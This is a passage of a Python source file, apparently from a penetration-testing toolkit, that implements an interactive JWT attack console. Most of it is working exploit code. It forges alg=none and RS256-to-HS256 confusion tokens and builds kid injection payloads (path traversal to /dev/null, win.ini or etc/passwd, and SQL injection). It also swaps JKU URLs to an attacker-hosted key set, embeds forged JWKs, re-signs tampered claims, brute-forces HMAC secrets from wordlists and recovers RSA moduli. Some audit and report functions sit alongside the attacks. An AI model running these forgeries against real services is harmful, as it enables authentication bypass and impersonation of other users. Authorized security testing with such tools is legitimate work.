                if "." in value:
                    coerced = float(value)
                else:
                    coerced = int(value)
            except Exception:
                coerced = value
        p[field] = coerced
        print(jwt_c_good(f"  - set '{field}' = {coerced!r}"))
    return p


# -----------------------------------------------------------------------------
# Forge operation 1: alg=none
# -----------------------------------------------------------------------------
def jwt_forge_alg_none(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    print(jwt_c_title("\n=== Forge: alg=none (strip signature) ==="))
    edit = input("Tamper any payload claims first? (y/n) [n]: ").strip().lower() == "y"
    payload = sess.active_info.payload
    if edit:
        payload = _jwt_edit_claims_interactive(payload)

    header = dict(sess.active_info.header)
    header["alg"] = "none"
    new_h = jwt_b64url_encode_json(header)
    new_p = jwt_b64url_encode_json(payload)
    new_token = f"{new_h}.{new_p}."  # empty signature
    _jwt_offer_set_active(sess, new_token, "alg=none")


# -----------------------------------------------------------------------------
# Forge operation 2: alg confusion (RS256 -> HS256 with public key as secret)
# -----------------------------------------------------------------------------
def jwt_forge_alg_confusion(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    print(jwt_c_title("\n=== Forge: Algorithm confusion (RS256 -> HS256) ==="))
    print(jwt_c_muted("Goal: server is told the token is HS256 and verifies using the *public* key as HMAC secret."))
    print(jwt_c_muted("You must supply the server's RSA public key (PEM or JWK)."))

    print("\nKey input format:")
    print("  [1] PEM (paste full -----BEGIN PUBLIC KEY----- block)")
    print("  [2] JWK JSON (single line)")
    fmt = input("Choose [1/2]: ").strip()

    if fmt == "1":
        print(jwt_c_muted("\nPaste PEM (end with a blank line):"))
        lines = []
        while True:
            try:
                line = input()
            except EOFError:
                break
            if not line.strip():
                break
            lines.append(line)
        pem_text = "\n".join(lines).strip()
        if not pem_text:
            print(jwt_c_warn("No PEM provided.")); return
        pem_bytes = pem_text.encode()
    elif fmt == "2":
        if not _jwt_require_crypto():
            return
        jwk_str = input("Paste JWK JSON: ").strip()
        try:
            jwk_obj = json.loads(jwk_str)
            pub = jwt_jwk_to_rsa_pubkey(jwk_obj)
            pem_bytes = jwt_rsa_pubkey_to_pem(pub)
            print(jwt_c_muted(f"\nDerived PEM:\n{pem_bytes.decode()}"))
        except Exception as e:
            print(jwt_c_bad(f"[!] Failed to parse JWK: {e}")); return
    else:
        print(jwt_c_warn("Cancelled.")); return

    print("\nSecret variant to try:")
    print("  [1] Use exact PEM bytes (most common variant)")
    print("  [2] Use one-liner PEM body (no BEGIN/END, no newlines)")
    print("  [3] Use PEM with trailing newline appended")
    sv = input("Choose [1/2/3] (default 1): ").strip() or "1"

    if sv == "2":
        body = b"".join(line for line in pem_bytes.splitlines() if b"BEGIN" not in line and b"END" not in line)
        secret = body
    elif sv == "3":
        secret = pem_bytes if pem_bytes.endswith(b"\n") else pem_bytes + b"\n"
    else:
        secret = pem_bytes

    edit = input("\nTamper any payload claims first? (y/n) [n]: ").strip().lower() == "y"
    payload = sess.active_info.payload
    if edit:
        payload = _jwt_edit_claims_interactive(payload)

    header = dict(sess.active_info.header)
    header["alg"] = "HS256"
    new_h = jwt_b64url_encode_json(header)
    new_p = jwt_b64url_encode_json(payload)
    signing_input = f"{new_h}.{new_p}"
    sig = jwt_sign_hs(secret, signing_input, "HS256")
    new_token = f"{signing_input}.{sig}"
    _jwt_offer_set_active(sess, new_token, "alg-confusion RS->HS")


# -----------------------------------------------------------------------------
# Forge operation 3: KID injection (path traversal / SQLi / URL / long)
# -----------------------------------------------------------------------------
def jwt_forge_kid_injection(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    print(jwt_c_title("\n=== Forge: KID injection ==="))
    print("KID payload variant:")
    print("  [1] Linux path traversal -> /dev/null (HS256, null-byte secret)")
    print("  [2] Windows path traversal -> NUL / win.ini / hosts")
    print("  [3] Custom path traversal target")
    print("  [4] SQL injection in kid (e.g.  ' UNION SELECT 'x'-- )")
    print("  [5] URL-style kid (kid as http(s)://...)")
    print("  [6] Very long kid (overflow / canary)")
    print("  [7] Custom literal kid value")
    mode = input("Choose [1-7]: ").strip()

    kid_value: Optional[str] = None
    secret: bytes = b"\x00"  # default null byte secret for /dev/null trick

    if mode == "1":
        try:
            depth = int(input("How many '../' to prepend (default 7): ").strip() or "7")
        except Exception:
            depth = 7
        kid_value = "../" * depth + "dev/null"
        secret = b"\x00"
    elif mode == "2":
        try:
            depth = int(input("How many '..\\\\' to prepend (default 7): ").strip() or "7")
        except Exception:
            depth = 7
        print("Windows target:")
        print("  [1] NUL    [2] win.ini    [3] hosts file")
        wc = input("Choose [1/2/3] (default 1): ").strip() or "1"
        traversal = "..\\" * depth
        if wc == "2":
            kid_value = f"{traversal}Windows\\win.ini"
        elif wc == "3":
            kid_value = f"{traversal}Windows\\System32\\drivers\\etc\\hosts"
        else:
            kid_value = f"{traversal}NUL"
        secret = b"\x00"
    elif mode == "3":
        try:
            depth = int(input("How many '../' to prepend (default 7): ").strip() or "7")
        except Exception:
            depth = 7
        target = input("Target path (e.g. etc/passwd, var/log/syslog): ").strip().lstrip("/")
        kid_value = "../" * depth + target
        custom_secret = input("HMAC secret to sign with (blank = null byte): ").strip()
        secret = custom_secret.encode() if custom_secret else b"\x00"
    elif mode == "4":
        kid_value = input("SQLi kid value [default: ' UNION SELECT 'AA' -- ]: ").strip() or "' UNION SELECT 'AA' -- "
        custom_secret = input("HMAC secret (blank = 'AA'): ").strip()
        secret = custom_secret.encode() if custom_secret else b"AA"
    elif mode == "5":
        kid_value = input("URL kid value (e.g. https://attacker.com/key.json): ").strip()
        if not kid_value:
            print(jwt_c_warn("Cancelled.")); return
        custom_secret = input("HMAC secret (blank = null byte): ").strip()
        secret = custom_secret.encode() if custom_secret else b"\x00"
    elif mode == "6":
        try:
            n = int(input("Length of kid in bytes (default 1024): ").strip() or "1024")
        except Exception:
            n = 1024
        kid_value = "A" * n
        custom_secret = input("HMAC secret (blank = null byte): ").strip()
        secret = custom_secret.encode() if custom_secret else b"\x00"
    elif mode == "7":
        kid_value = input("Literal kid value: ").strip()
        custom_secret = input("HMAC secret (blank = null byte): ").strip()
        secret = custom_secret.encode() if custom_secret else b"\x00"
    else:
        print(jwt_c_warn("Cancelled.")); return

    if kid_value is None:
        return

    edit = input("\nTamper any payload claims first? (y/n) [n]: ").strip().lower() == "y"
    payload = sess.active_info.payload
    if edit:
        payload = _jwt_edit_claims_interactive(payload)

    header = dict(sess.active_info.header)
    header["alg"] = "HS256"
    header["kid"] = kid_value
    new_h = jwt_b64url_encode_json(header)
    new_p = jwt_b64url_encode_json(payload)
    signing_input = f"{new_h}.{new_p}"
    sig = jwt_sign_hs(secret, signing_input, "HS256")
    new_token = f"{signing_input}.{sig}"
    print(jwt_c_muted(f"\nkid set to: {kid_value!r}"))
    print(jwt_c_muted(f"signed with HMAC secret: {secret!r}"))
    _jwt_offer_set_active(sess, new_token, "KID injection")


# -----------------------------------------------------------------------------
# Forge operation 4: JKU swap
# -----------------------------------------------------------------------------
def jwt_forge_jku_swap(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    if not _jwt_require_crypto():
        return
    print(jwt_c_title("\n=== Forge: JKU swap ==="))
    print(jwt_c_muted("Generates a fresh RSA keypair, sets header.jku to your URL, and signs with private key."))
    print(jwt_c_muted("You must host the matching JWKS at that URL for the attack to succeed."))

    jku_url = input("JKU URL (e.g. https://exploit-server.net/jwks.json): ").strip()
    if not jku_url:
        print(jwt_c_warn("Cancelled.")); return

    edit = input("Tamper any payload claims first? (y/n) [n]: ").strip().lower() == "y"
    payload = sess.active_info.payload
    if edit:
        payload = _jwt_edit_claims_interactive(payload)

    priv, pub = jwt_rsa_generate_keypair(2048)
    kid = "vapt-" + shared_rand(8)
    jwk_obj = jwt_rsa_pubkey_to_jwk(pub, kid=kid)

    header = dict(sess.active_info.header)
    header["alg"] = "RS256"
    header["kid"] = kid
    header["jku"] = jku_url
    # Remove any embedded jwk to avoid dual-trust ambiguity
    header.pop("jwk", None)

    new_h = jwt_b64url_encode_json(header)
    new_p = jwt_b64url_encode_json(payload)
    signing_input = f"{new_h}.{new_p}"
    sig = jwt_sign_rs256(priv, signing_input)
    new_token = f"{signing_input}.{sig}"

    print(jwt_c_title("\n--- Host this JWKS at " + jku_url + " ---"))
    print(jwt_pretty_json({"keys": [jwk_obj]}))
    print(jwt_c_title("\n--- Generated RSA private key (keep) ---"))
    print(jwt_rsa_privkey_to_pem(priv).decode())
    _jwt_offer_set_active(sess, new_token, "JKU swap")


# -----------------------------------------------------------------------------
# Forge operation 5: Embed JWK in header (RSA whole-key)
# -----------------------------------------------------------------------------
def jwt_forge_embed_jwk_rsa(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    if not _jwt_require_crypto():
        return
    print(jwt_c_title("\n=== Forge: Embed JWK in header (RSA whole-key) ==="))
    print(jwt_c_muted("Generates fresh RSA keypair, places full JWK (kty=RSA, n, e) in header.jwk,"))
    print(jwt_c_muted("signs the token with the matching private key. Server may trust the embedded JWK directly."))

    edit = input("Tamper any payload claims first? (y/n) [n]: ").strip().lower() == "y"
    payload = sess.active_info.payload
    if edit:
        payload = _jwt_edit_claims_interactive(payload)

    priv, pub = jwt_rsa_generate_keypair(2048)
    kid = "vapt-" + shared_rand(8)
    jwk_obj = jwt_rsa_pubkey_to_jwk(pub, kid=kid)

    header = dict(sess.active_info.header)
    header["alg"] = "RS256"
    header["kid"] = kid
    header["jwk"] = jwk_obj
    header.pop("jku", None)  # avoid jku/jwk ambiguity

    new_h = jwt_b64url_encode_json(header)
    new_p = jwt_b64url_encode_json(payload)
    signing_input = f"{new_h}.{new_p}"
    sig = jwt_sign_rs256(priv, signing_input)
    new_token = f"{signing_input}.{sig}"

    print(jwt_c_muted("\nEmbedded JWK:"))
    print(jwt_pretty_json(jwk_obj))
    _jwt_offer_set_active(sess, new_token, "embed JWK (RSA)")


# -----------------------------------------------------------------------------
# Forge operation 6: Embed JWK in header (symmetric, "k" param)
# -----------------------------------------------------------------------------
def jwt_forge_embed_jwk_symmetric_k(sess: JwtSession) -> None:
    """
    Symmetric "k" trick: header.jwk = {"kty":"oct","k":"<base64url(secret)>"}
    Token is HS256-signed with the SAME secret material the server can derive
    by base64url-decoding header.jwk.k. If the server trusts header.jwk to
    pick the verification key, it accepts.

    Two source-material options for the symmetric secret:
      a) Base64url-encode an arbitrary user-provided secret string (clean variant).
      b) Base64url-encode the server's RSA public key PEM bytes (legacy 'k' trick
         from old jwt-attacker.py option 7).
    """
    if not _jwt_require_active(sess):
        return
    print(jwt_c_title("\n=== Forge: Embed JWK in header (symmetric 'k' parameter) ==="))
    print(jwt_c_muted("Header receives jwk={kty:oct, k:<base64>} and is HS256-signed with the same key bytes."))

    print("\nSecret material source:")
    print("  [1] Custom secret string  (k = base64url(your bytes))")
    print("  [2] Server RSA public key as material  (k = base64url(PEM bytes))")
    src = input("Choose [1/2] (default 1): ").strip() or "1"

    secret_bytes: bytes
    if src == "1":
        s = input("Secret string: ").strip()
        if not s:
            print(jwt_c_warn("Cancelled.")); return
        secret_bytes = s.encode()
    else:
        if not _jwt_require_crypto():
            return
        print(jwt_c_muted("\nPaste server PEM (end with a blank line):"))
        lines = []
        while True:
            try:
                line = input()
            except EOFError:
                break
            if not line.strip():
                break
            lines.append(line)
        pem_text = "\n".join(lines).strip()
        if not pem_text:
            print(jwt_c_warn("No PEM provided.")); return
        # Append a trailing newline to match common server-side reads
        secret_bytes = pem_text.encode()
        if not secret_bytes.endswith(b"\n"):
            secret_bytes += b"\n"

    edit = input("\nTamper any payload claims first? (y/n) [n]: ").strip().lower() == "y"
    payload = sess.active_info.payload
    if edit:
        payload = _jwt_edit_claims_interactive(payload)

    k_b64 = jwt_b64url_encode_bytes(secret_bytes)
    embedded_jwk = {"kty": "oct", "k": k_b64}

    header = dict(sess.active_info.header)
    header["alg"] = "HS256"
    header["jwk"] = embedded_jwk
    header.pop("jku", None)

    new_h = jwt_b64url_encode_json(header)
    new_p = jwt_b64url_encode_json(payload)
    signing_input = f"{new_h}.{new_p}"
    sig = jwt_sign_hs(secret_bytes, signing_input, "HS256")
    new_token = f"{signing_input}.{sig}"

    print(jwt_c_muted(f"\nEmbedded JWK: {embedded_jwk}"))
    _jwt_offer_set_active(sess, new_token, "embed JWK (sym k)")


# -----------------------------------------------------------------------------
# Forge operation 7: Tamper claims (no signature change of alg)
# -----------------------------------------------------------------------------
def jwt_forge_tamper_claims(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    print(jwt_c_title("\n=== Forge: Tamper payload claims + re-sign ==="))
    payload = _jwt_edit_claims_interactive(sess.active_info.payload)

    print("\nSignature strategy:")
    print("  [1] Keep original signature (will fail verification, useful to confirm validation logic)")
    print("  [2] HMAC re-sign with custom secret (HS256/384/512)")
    print("  [3] alg=none (drop signature)")
    sig_mode = input("Choose [1/2/3] (default 2): ").strip() or "2"

    header = dict(sess.active_info.header)
    new_p = jwt_b64url_encode_json(payload)

    if sig_mode == "1":
        new_h = jwt_b64url_encode_json(header)
        new_token = f"{new_h}.{new_p}.{sess.active_info.signature_b64}"
        _jwt_offer_set_active(sess, new_token, "tamper-claims keep-sig")
    elif sig_mode == "3":
        header["alg"] = "none"
        new_h = jwt_b64url_encode_json(header)
        new_token = f"{new_h}.{new_p}."
        _jwt_offer_set_active(sess, new_token, "tamper-claims alg=none")
    else:
        algo = (input("HS algorithm [HS256/HS384/HS512] (default HS256): ").strip().upper() or "HS256")
        if algo not in ("HS256", "HS384", "HS512"):
            algo = "HS256"
        secret = input("HMAC secret: ").strip()
        if not secret:
            print(jwt_c_warn("Cancelled.")); return
        header["alg"] = algo
        new_h = jwt_b64url_encode_json(header)
        signing_input = f"{new_h}.{new_p}"
        sig = jwt_sign_hs(secret.encode(), signing_input, algo)
        new_token = f"{signing_input}.{sig}"
        _jwt_offer_set_active(sess, new_token, f"tamper-claims {algo}")


# -----------------------------------------------------------------------------
# Forge operation 8: Re-sign with custom HMAC secret (no claim change)
# -----------------------------------------------------------------------------
def jwt_forge_resign_hmac(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    print(jwt_c_title("\n=== Forge: Re-sign with custom HMAC secret ==="))
    algo = (input("HS algorithm [HS256/HS384/HS512] (default HS256): ").strip().upper() or "HS256")
    if algo not in ("HS256", "HS384", "HS512"):
        algo = "HS256"
    secret = input("Secret: ").strip()
    if not secret:
        print(jwt_c_warn("Cancelled.")); return

    header = dict(sess.active_info.header)
    header["alg"] = algo
    new_h = jwt_b64url_encode_json(header)
    new_p = sess.active_info.payload_b64
    signing_input = f"{new_h}.{new_p}"
    sig = jwt_sign_hs(secret.encode(), signing_input, algo)
    new_token = f"{signing_input}.{sig}"
    _jwt_offer_set_active(sess, new_token, f"resign {algo}")


# -----------------------------------------------------------------------------
# Tool 9: HS256 brute-force with wordlist
# -----------------------------------------------------------------------------
def jwt_brute_hs256(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    if not (sess.active_info.alg or "").upper().startswith("HS"):
        print(jwt_c_warn(f"Active token alg is {sess.active_info.alg!r} -- brute-force only meaningful for HS*."))
        if input("Continue anyway? (y/n) [n]: ").strip().lower() != "y":
            return
    path = input("Wordlist file path: ").strip()
    if not path or not os.path.isfile(path):
        print(jwt_c_bad("[!] Wordlist not found."))
        return

    h_b64 = sess.active_info.header_b64
    p_b64 = sess.active_info.payload_b64
    sig_b64 = sess.active_info.signature_b64
    signing_input = f"{h_b64}.{p_b64}"
    target_sig = sig_b64

    algo_name = (sess.active_info.alg or "HS256").upper()
    h_func = {
        "HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512,
    }.get(algo_name, hashlib.sha256)

    print(jwt_c_muted(f"Brute-forcing {algo_name} signature..."))
    found: Optional[str] = None
    tried = 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for raw in f:
                cand = raw.rstrip("\r\n")
                if not cand:
                    continue
                tried += 1
                sig = hmac.new(cand.encode(), signing_input.encode(), h_func).digest()
                if jwt_b64url_encode_bytes(sig) == target_sig:
                    found = cand
                    break
                if tried % 5000 == 0:
                    print(jwt_c_muted(f"  tried {tried}..."))
    except KeyboardInterrupt:
        print(jwt_c_warn("\n[!] Interrupted."))
    print(jwt_c_muted(f"Tried {tried} candidates."))
    if found is not None:
        print(jwt_c_good(f"\n[+] Secret found: {found!r}"))
    else:
        print(jwt_c_warn("[-] No secret matched."))


# -----------------------------------------------------------------------------
# Tool 10: RS256 modulus recovery from two JWTs
# -----------------------------------------------------------------------------
def jwt_recover_modulus(sess: JwtSession) -> None:
    if not _jwt_require_crypto():
        return
    print(jwt_c_title("\n=== RS256 Modulus Recovery (from two tokens with same key) ==="))
    print(jwt_c_muted("Mathematical: gcd(sig1^e - H1, sig2^e - H2) often reveals N (the RSA modulus)."))
    print(jwt_c_muted("Use two DIFFERENT JWTs that you believe were signed with the SAME RSA private key."))

    j1 = input("\nJWT #1: ").strip()
    j2 = input("JWT #2: ").strip()
    if not j1 or not j2:
        print(jwt_c_warn("Cancelled.")); return

    try:
        h1, p1, s1 = j1.split(".")
        h2, p2, s2 = j2.split(".")
        sig1 = int.from_bytes(jwt_b64url_decode_to_bytes(s1), "big")
        sig2 = int.from_bytes(jwt_b64url_decode_to_bytes(s2), "big")
        m1 = int.from_bytes(hashlib.sha256(f"{h1}.{p1}".encode()).digest(), "big")
        m2 = int.from_bytes(hashlib.sha256(f"{h2}.{p2}".encode()).digest(), "big")
        e_pub = 65537
        diff1 = abs(pow(sig1, e_pub) - m1)
        diff2 = abs(pow(sig2, e_pub) - m2)
        import math as _math
        n = _math.gcd(diff1, diff2)
        if n.bit_length() < 256:
            print(jwt_c_bad(f"[!] Recovered modulus too small ({n.bit_length()} bits) -- recovery failed."))
            return
        from cryptography.hazmat.primitives.asymmetric import rsa
        pub = rsa.RSAPublicNumbers(e_pub, n).public_key()
        pem = jwt_rsa_pubkey_to_pem(pub).decode()
        print(jwt_c_good(f"\n[+] Recovered modulus ({n.bit_length()} bits)."))
        print(jwt_c_title("\nPublic key (PEM):"))
        print(pem)
        print(jwt_c_title("Public key (JWK):"))
        print(jwt_pretty_json(jwt_rsa_pubkey_to_jwk(pub)))
    except Exception as e:
        print(jwt_c_bad(f"[!] Modulus recovery failed: {e}"))


# -----------------------------------------------------------------------------
# Tool 11: PEM <-> JWK conversion utilities
# -----------------------------------------------------------------------------
def jwt_pem_jwk_utilities() -> None:
    if not _jwt_require_crypto():
        return
    print(jwt_c_title("\n=== PEM <-> JWK Conversions ==="))
    print("  [1] JWK (public, RSA) -> PEM (full BEGIN/END block)")
    print("  [2] JWK (public, RSA) -> PEM body only (one-liner, no BEGIN/END/newlines)")
    print("  [3] PEM (public, RSA) -> JWK JSON")
    print("  [4] PEM (public, RSA) -> one-liner body string")
    print("  [0] Back")
    sub = input("Choose: ").strip()
    if sub == "0":
        return

    from cryptography.hazmat.primitives import serialization

    if sub in ("1", "2"):
        jwk_str = input("Paste JWK JSON: ").strip()
        try:
            jwk_obj = json.loads(jwk_str)
            pub = jwt_jwk_to_rsa_pubkey(jwk_obj)
            pem = jwt_rsa_pubkey_to_pem(pub).decode()
            if sub == "1":
                print(jwt_c_good("\nPEM:")); print(pem)
            else:
                body = "".join(line for line in pem.splitlines() if "BEGIN" not in line and "END" not in line)
                print(jwt_c_good("\nOne-liner PEM body:")); print(body)
        except Exception as e:
            print(jwt_c_bad(f"[!] {e}"))
    elif sub in ("3", "4"):
        print(jwt_c_muted("\nPaste PEM (end with blank line):"))
        lines = []
        while True:
            try:
                line = input()
            except EOFError:
                break
            if not line.strip():
                break
            lines.append(line)
        pem_text = "\n".join(lines).strip()
        if not pem_text:
            print(jwt_c_warn("No PEM provided.")); return
        try:
            pub = serialization.load_pem_public_key(pem_text.encode())
            if sub == "3":
                print(jwt_c_good("\nJWK:"))
                print(jwt_pretty_json(jwt_rsa_pubkey_to_jwk(pub)))
            else:
                body = "".join(line for line in pem_text.splitlines() if "BEGIN" not in line and "END" not in line)
                print(jwt_c_good("\nOne-liner PEM body:")); print(body)
        except Exception as e:
            print(jwt_c_bad(f"[!] {e}"))
    else:
        print(jwt_c_warn("Unknown option."))


# -----------------------------------------------------------------------------
# Audit / inspector operations (work on the active token, no re-prompt)
# -----------------------------------------------------------------------------
def jwt_show_decoded(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    j = sess.active_info
    print(jwt_c_title("\n=== Decoded ==="))
    print(jwt_c_title("Header (JSON):"))
    print(jwt_pretty_json(j.header))
    print(jwt_c_title("\nPayload (JSON):"))
    print(jwt_pretty_json(j.payload))
    print(jwt_c_muted(f"\nSignature (b64): {j.signature_b64[:40] + '...' if len(j.signature_b64) > 40 else j.signature_b64}"))


def jwt_show_summary(j: JwtInfo, idx: int = 1) -> None:
    print(jwt_c_title(f"\n=== Token #{idx} ==="))
    if j.parse_error:
        print(jwt_c_bad(f"[!] {j.parse_error}"))
        return
    alg = j.alg or "(missing)"
    print(f"- alg: {jwt_c_good(alg) if alg.lower() not in ('none','') else jwt_c_bad(alg)}")
    if j.kid: print(f"- kid: {j.kid}")
    if j.jku: print(f"- jku: {j.jku}")
    print(f"- jwk present: {jwt_c_warn('yes') if j.has_jwk else 'no'}")

    print(jwt_c_muted("\nClaims snapshot:"))
    for k in ("sub", "iss", "aud", "exp"):
        v = j.payload.get(k) if j.payload else None
        if v is None:
            print(f"  - {k}: {jwt_c_warn('(missing)')}")
        else:
            print(f"  - {k}: {v}")

    if j.risk_flags:
        print(jwt_c_warn("\nHeuristic flags to validate:"))
        for f in j.risk_flags:
            if any(x in f.lower() for x in ("none", "path traversal", "attacker", "must be rejected")):
                print(f"  - {jwt_c_bad(f)}")
            else:
                print(f"  - {jwt_c_warn(f)}")
    else:
        print(jwt_c_good("\nNo heuristic flags triggered. (Still validate claims + alg strictness.)"))


def jwt_run_risk_analysis(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    jwt_show_summary(sess.active_info, 1)


def jwt_run_jwks_probe(sess: JwtSession) -> None:
    if not sess.ctx.base_url.strip():
        print(jwt_c_warn("[!] No base URL configured. Use [s] to set session context first."))
        return
    print(jwt_c_title("\n=== JWKS / OIDC Discovery ==="))
    print(jwt_c_muted("Probing common endpoints..."))
    discoveries = jwt_probe_endpoints(sess.ctx)
    for d in discoveries:
        if d.status == 0:
            print(f"- {d.url} -> {jwt_c_bad('FAILED')} ({d.note})")
        elif d.status == 200 and any(x in (d.body_snippet or "").lower() for x in ("jwks", "jwks_uri", "keys")):
            print(f"- {d.url} -> {jwt_c_good(str(d.status))} {d.content_type} {d.note}")
        else:
            print(f"- {d.url} -> {d.status} {d.content_type}")
    sess._last_discoveries = discoveries  # type: ignore[attr-defined]


def jwt_run_test_plan_export(sess: JwtSession) -> None:
    if not _jwt_require_active(sess):
        return
    discoveries: List[JwtDiscoveryResult] = getattr(sess, "_last_discoveries", []) or []
    if not discoveries and sess.ctx.base_url.strip():
        if input("Run JWKS discovery first? (y/n) [y]: ").strip().lower() != "n":
            jwt_run_jwks_probe(sess)
            discoveries = getattr(sess, "_last_discoveries", []) or []

    plan_md = jwt_generate_test_plan([sess.active_info], sess.ctx)
    print(jwt_c_title("\n=== Test plan preview (first 2000 chars) ==="))
    print(plan_md[:2000])
    if len(plan_md) > 2000:
        print(jwt_c_muted("...(truncated; full plan exported when you choose to export)..."))

    if input("\nExport report (JSON + Markdown) to a folder? (y/n) [y]: ").strip().lower() != "n":
        outdir = jwt_make_output_dir("jwt-audit")
        json_path, md_path = jwt_export_report(
            outdir, sess.ctx, [sess.active_info], discoveries, plan_md, sess.history
        )
        print(jwt_c_good(f"\nExported: {json_path}"))
        print(jwt_c_good(f"Exported: {md_path}"))
        print(jwt_c_muted(f"Folder:   {outdir}"))


# -----------------------------------------------------------------------------
# Session / token / history management
# -----------------------------------------------------------------------------
def jwt_load_token(sess: JwtSession) -> None:
    print(jwt_c_title("\n=== Load / replace active token ==="))
    t = input("Paste JWT: ").strip()
    if not t:
        print(jwt_c_warn("No token entered."))
        return
    sess.set_active(t, label="loaded")
    info = sess.active_info
    if info and info.parse_error:
        print(jwt_c_bad(f"[!] Parse error: {info.parse_error}"))
    else:
        print(jwt_c_good("[+] Active token replaced."))
        jwt_show_summary(info, 1)


def jwt_configure_session(sess: JwtSession) -> None:
    print(jwt_c_title("\n=== Configure session context ==="))
    base = input(f"Base URL (e.g. https://target.com) [{sess.ctx.base_url}]: ").strip()
    if base:
        sess.ctx.base_url = base
    auth = input(f"Authorization value (e.g. 'Bearer xxx') [{'set' if sess.ctx.authorization else 'empty'}]: ").strip()
    if auth:
        sess.ctx.authorization = auth
    cookie = input(f"Cookie header value [{'set' if sess.ctx.cookie else 'empty'}]: ").strip()
    if cookie:
        sess.ctx.cookie = cookie
    extra = input("Extra headers JSON (e.g. {\"X-Env\":\"UAT\"}) [blank to keep]: ").strip()
    if extra:
        sess.ctx.extra_headers_json = extra
    print(jwt_c_good("[+] Session updated."))


def jwt_show_history(sess: JwtSession) -> None:
    print(jwt_c_title("\n=== Forge / load history ==="))
    if not sess.history:
        print(jwt_c_muted("(empty)"))
        return
    for i, (label, tok) in enumerate(sess.history, start=1):
        preview = tok[:50] + "..." if len(tok) > 50 else tok
        print(f"  [{i}] {label:24s}  {preview}")
    sel = input("\nLoad which entry as active token? (number, blank to skip): ").strip()
    if not sel:
        return
    try:
        idx = int(sel) - 1
        if 0 <= idx < len(sess.history):
            label, tok = sess.history[idx]
            sess.active_token = tok
            sess.active_info = jwt_parse(tok)
            print(jwt_c_good(f"[+] Active token replaced with history entry #{idx + 1} ({label})."))
        else:
            print(jwt_c_warn("Out of range."))
    except Exception:
        print(jwt_c_warn("Invalid input."))


# -----------------------------------------------------------------------------
# Status bar + menu rendering
# -----------------------------------------------------------------------------
def jwt_render_status(sess: JwtSession) -> None:
    print("\n" + jwt_hr("="))
    if sess.active_token:
        preview = sess.active_token[:50] + "..." if len(sess.active_token) > 50 else sess.active_token
        info = sess.active_info
        if info and not info.parse_error:
            extras = []
            extras.append(f"alg={info.alg or '?'}")
            if info.kid: extras.append(f"kid={info.kid[:20] + ('...' if len(info.kid) > 20 else '')}")
            if info.jku: extras.append(f"jku={info.jku[:30] + ('...' if len(info.jku) > 30 else '')}")
            if info.has_jwk: extras.append("jwk=yes")
            print(jwt_c_good(f"Active token: {preview}"))
            print(jwt_c_muted(f"              ({', '.join(extras)})"))
        else:
            print(jwt_c_warn(f"Active token: {preview}  [parse error]"))
    else:
        print(jwt_c_muted("Active token: (none -- press [t] to load)"))

    ctx_bits = []
    if sess.ctx.base_url: ctx_bits.append(f"url={sess.ctx.base_url}")
    if sess.ctx.authorization: ctx_bits.append("auth=set")
    if sess.ctx.cookie: ctx_bits.append("cookie=set")
    ctx_str = ", ".join(ctx_bits) if ctx_bits else "(unset)"
    print(jwt_c_muted(f"Session ctx:  {ctx_str}"))
    print(jwt_c_muted(f"History:      {len(sess.history)} entries"))
    print(jwt_hr("="))


def jwt_render_menu() -> None:
    print(jwt_c_title("Token & Session"))
    print("  [d] Decode / show full header + payload")
    print("  [t] Load / replace active token")
    print("  [s] Configure session context (base URL, auth, cookies)")
    print(jwt_c_title("Audit"))
    print("  [a] Risk analysis + heuristic flags")
    print("  [j] JWKS / OIDC discovery (uses session base URL)")
    print("  [r] Generate test plan + export JSON/MD report")
    print(jwt_c_title("Forge / Exploit"))
    print("  [1] alg=none (strip signature)")
    print("  [2] alg confusion: RS256 -> HS256 (sign with public key as HMAC secret)")
    print("  [3] KID injection (path traversal / SQLi / URL / long-value / custom)")
    print("  [4] JKU swap (point header.jku at attacker URL; generates fresh keypair)")
    print("  [5] Embed JWK in header (RSA whole-key: kty=RSA, n, e)")
    print("  [6] Embed JWK in header (symmetric 'k' parameter: kty=oct)")
    print("  [7] Tamper claims + re-sign")
    print("  [8] Re-sign with custom HMAC secret (no claim change)")
    print("  [9] HS256 brute-force (wordlist)")
    print("  [10] RS256 modulus recovery (from 2 tokens)")
    print("  [11] PEM <-> JWK conversion utilities")
    print(jwt_c_title("Other"))
    print("  [h] Show forge / load history (and reload any prior token)")
    print("  [q] Back to main toolkit menu")
    print(jwt_hr())


# -----------------------------------------------------------------------------
# Top-level entry point
# -----------------------------------------------------------------------------
def run_jwt_attacker() -> None:
    sess = JwtSession()
    print(JWT_BANNER)

    while True:
        jwt_render_status(sess)
        jwt_render_menu()
        choice = input("Action: ").strip().lower()
        if choice in ("q", "0", ""):
            return

        try:
            if choice == "d":   jwt_show_decoded(sess)
            elif choice == "t": jwt_load_token(sess)
            elif choice == "s": jwt_configure_session(sess)
            elif choice == "a": jwt_run_risk_analysis(sess)
            elif choice == "j": jwt_run_jwks_probe(sess)
            elif choice == "r": jwt_run_test_plan_export(sess)
            elif choice == "1": jwt_forge_alg_none(sess)
            elif choice == "2": jwt_forge_alg_confusion(sess)
            elif choice == "3": jwt_forge_kid_injection(sess)
            elif choice == "4": jwt_forge_jku_swap(sess)
            elif choice == "5": jwt_forge_embed_jwk_rsa(sess)
            elif choice == "6": jwt_forge_embed_jwk_symmetric_k(sess)
            elif choice == "7": jwt_forge_tamper_claims(sess)
            elif choice == "8": jwt_forge_resign_hmac(sess)
            elif choice == "9": jwt_brute_hs256(sess)
            elif choice == "10": jwt_recover_modulus(sess)
            elif choice == "11": jwt_pem_jwk_utilities()
            elif choice == "h": jwt_show_history(sess)
            else:
                print(jwt_c_warn("Unknown option."))
        except KeyboardInterrupt:
            print(jwt_c_warn("\n[!] Operation cancelled. Returning to JWT menu."))
        except Exception as e:
            print(jwt_c_bad(f"\n[!] Operation crashed: {e}"))
# TOOL 3: Insecure Headers Enumeration
# ===========================================================================
